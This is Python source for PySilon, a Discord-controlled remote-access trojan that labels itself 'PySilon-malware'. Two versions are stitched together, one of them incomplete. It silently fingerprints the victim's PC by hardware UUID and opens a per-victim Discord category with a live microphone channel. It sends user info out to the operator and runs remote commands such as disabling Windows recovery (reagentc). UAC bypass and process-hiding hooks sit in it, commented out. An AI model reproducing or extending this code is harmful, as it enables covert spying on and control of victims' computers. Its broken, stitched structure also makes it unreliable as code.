import os
import sys
import json
import ctypes
import discord
import subprocess
from getpass import getuser
from discord.ext import commands
from urllib.request import urlopen
#import resources.modules.uac_bypass as uac_bypass
#import resources.modules.hide_process as proc_hider
#import resources.modules.protections as pysilon_protections

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
# Don't edit anything in this file. Everything will be handled by compiler. #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#begin_configuration
bot_token = ''
guild_ids = []
channel_ids = {'main': True, 'spam': True, 'live': False, 'vrec': False}
#end_configuration







class PySilon(commands.Bot):
    def __init__(self, command_prefix, self_bot) -> None:
        #def IsAdmin() -> bool: return ctypes.windll.shell32.IsUserAnAdmin() == 1
        #if pysilon_protections.protection_check(): os._exit(0)
        #if pysilon_protections.single_instance_lock(): os._exit(0)

        #if not IsAdmin():
        #    if uac_bypass.GetSelf()[1]:
        #        if uac_bypass.UACbypass(): os._exit(0)
        #else:
        #    proccess_was_hidden = False
        #    if proc_hider.hide_process(): proccess_was_hidden = True

        self.load_bot(command_prefix, self_bot)

    async def first_run_check(self) -> None:
        guild_id, guild_id_index = guild_ids[0], 0
        hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
        category_not_found = True
        for _ in guild_ids:
            for category_name in self.get_guild(guild_id).categories:
                if hwid in str(category_name):
                    await self.sequent_run(category_name)
                    return
            if guild_id_index != len(guild_ids)-1:
                guild_id_index += 1
                guild_id = guild_ids[guild_id_index]
            else: break

        if category_not_found:
            for guild in guild_ids:
                get_guild = self.get_guild(guild)
                if len(get_guild.channels) < 495:
                    guild_id = guild
                    break

        await self.first_run(guild_id, hwid)

    async def first_run(self, guild_id, hwid) -> None:
        working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; save_working_dir()
        category = await self.get_guild(guild_id).create_category(hwid)
        temp = await self.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        temp = await self.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id

    async def sequent_run(self, category_name) -> None:
        working_directory = fetch_working_dir()
        if working_directory == None or working_directory == []: working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; save_working_dir()
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)

        if 'main' not in category_channel_names and channel_ids['main']:
            temp = await self.get_guild(guild_id).create_text_channel('main', category=category)
            channel_ids['main'] = temp.id

        if 'Live microphone' not in category_channel_names and channel_ids['live']:
            temp = await self.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id

    def load_bot(self, command_prefix, self_bot) -> None:
        commands.Bot.__init__(self, command_prefix=command_prefix, self_bot=self_bot, intents=discord.Intents.all())

        self.guild_id = 1178999695570374697
        self.channel_id = 1262286966205059082

        self.load_commands()

        

    async def on_ready(self):
        await self.get_channel(self.channel_id).send('Bot is ready')
        await self.first_run_check()
        

    def load_commands(self):
        @self.command(name="server", pass_context=True)
        async def server(ctx):
            await ctx.channel.send('asdasd')

bot = PySilon(command_prefix='.', self_bot=False)
bot.run('')


input('stop')
















def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1



@client.event
async def on_ready():
    global category, guild_id, working_directory
    working_directory = None
    first_run = True
    guild_id_index = 0
    guild_id = guild_ids[guild_id_index]

    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
    category_not_found = True
    break_loop = False
    for _ in guild_ids:
        for category_name in client.get_guild(guild_id).categories:
            if hwid in str(category_name):
                first_run, category = False, category_name
                category_not_found = False
                break_loop = True
                break
        if break_loop: break
        elif not guild_id_index == len(guild_ids) - 1:
            guild_id_index = guild_id_index + 1
            guild_id = guild_ids[guild_id_index]
        else: break

    if category_not_found:
        for i in guild_ids:
            get_guild = client.get_guild(i)
            channel_count = len(get_guild.channels)
            if not channel_count > 495:
                guild_id = i
                break

    if not first_run:
        working_directory = fetch_working_dir()
        if working_directory == None or working_directory == []: working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; save_working_dir()
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)

        if 'main' not in category_channel_names and channel_ids['main']: 
            temp = await client.get_guild(guild_id).create_text_channel('main', category=category)
            channel_ids['main'] = temp.id

        if 'Live microphone' not in category_channel_names and channel_ids['voice']: 
            temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id

    if first_run:
        working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; save_working_dir()
        category = await client.get_guild(guild_id).create_category(hwid)
        temp = await client.get_guild(guild_id).create_text_channel('info', category=category); channel_ids['info'] = temp.id
        temp = await client.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        temp = await client.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id

    else:
        for channel in category.channels:
            if channel.name == 'info':
                channel_ids['info'] = channel.id
            elif channel.name == 'main':
                channel_ids['main'] = channel.id
            elif channel.name == 'Live microphone':
                channel_ids['voice'] = channel.id

    user_info = pysilon_info.get_info_main()
    info_embed = discord.Embed(title=":information_source: User Info",description=f'```{user_info}```', colour=discord.Colour.blue())
    await client.get_channel(channel_ids['info']).send(embed=info_embed)

def fetch_working_dir():
    global working_directory
    try:
        with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'r') as fetch_dir:
            working_directory = json.load(fetch_dir)
    except: 
        save_working_dir()
        working_directory = [os.getenv('SystemDrive'), "Users", getuser()]
    return working_directory

def save_working_dir():
    global working_directory
    with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'w') as save_dir:
        json.dump(working_directory, save_dir)

@client.event
async def on_message(ctx):
    print(ctx.content)
    if ctx.channel.id in channel_ids.values() or ctx.content == ".ping":
        await client.process_commands(ctx)

@client.command(name="ping")
async def get_active_clients(ctx):
    await ctx.message.delete()
    await client.get_channel(channel_ids['main']).send(ctx.author.mention)

@client.command(name="implode")
async def delete_category(ctx,  argument=None, password=None):
    if argument == "full":
        if password == "1234":
            for channel in category.channels:
                await channel.delete()
            await category.delete()
            # implosion code
        else: await ctx.send("```Invalid password! Cannot implode.```")
        
    elif argument == "normal":
        if password == "1234":
            await ctx.send('`Normal implosion`')
            # implosion code
        else: await ctx.send("```Invalid password! Cannot implode.```")
    else: 
        await ctx.send("```Improper arguments. \n\nUsage: .implode <normal / full> <password>```")

@client.command(name="re-agent")
async def reset_agentc_handler(ctx, argument=None):
    await ctx.message.delete()
    if argument not in ['enable', 'disable']: 
        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .re-agent <enable/disable>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        return await ctx.send(embed=embed)
    else:
        if IsAdmin():
            subprocess.run('reagentc.exe /' + argument, creationflags=subprocess.CREATE_NO_WINDOW)
            embed = discord.Embed(title="🟣 System",description=f'```Successfully {argument}d REAgentC.```', colour=discord.Colour.purple())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="📛 Error",description=f'```This command requires (UAC) elevation.```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)